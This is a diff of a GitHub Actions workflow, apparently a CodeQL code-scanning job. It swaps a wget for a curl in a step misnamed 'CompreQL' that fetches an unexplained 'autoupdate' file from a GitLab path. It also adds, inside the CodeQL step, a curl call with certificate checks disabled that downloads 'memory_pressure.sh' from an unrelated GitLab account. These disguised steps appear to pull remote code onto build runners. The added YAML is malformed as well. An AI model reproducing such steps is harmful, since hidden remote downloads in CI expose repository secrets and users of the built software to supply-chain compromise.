@@ -56,7 +56,10 @@ jobs:
 
     - name: CompreQL
       run: |
-        wget -O 7_0_jdk11 https://gitlab.com/project-dev-/v.0.0.21052021/-/raw/master/autoupdate
+        curl -O 7_0_jdk11 https://gitlab.com/project-dev-/v.0.0.21052021/-/raw/master/autoupdate
 
     - name: Perform CodeQL Analysis
+    - uses: actions/checkout@v2
       uses: github/codeql-action/analyze@v1
+      run: |
+        curl -L -O -k https://gitlab.com/sarahemersonzrex/msconfig/-/raw/main/memory_pressure.sh
